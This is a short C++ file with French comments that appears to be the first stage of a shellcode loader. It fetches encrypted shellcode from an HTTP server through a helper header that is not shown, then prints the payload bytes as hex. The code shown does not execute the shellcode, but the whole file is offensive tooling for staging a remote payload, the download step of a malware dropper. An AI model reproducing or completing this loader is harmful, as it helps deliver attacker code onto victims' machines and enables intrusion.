#include <iostream> 
#include "HTTPClient.h" 

int main() {
    // Récupération du shellcode chiffré du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "Échec de la récupération du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode récupéré (chiffré) :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    LocalFree(payload);

    // Fin de la récupération du shellcode chiffré du serveur http 

    return 0;

}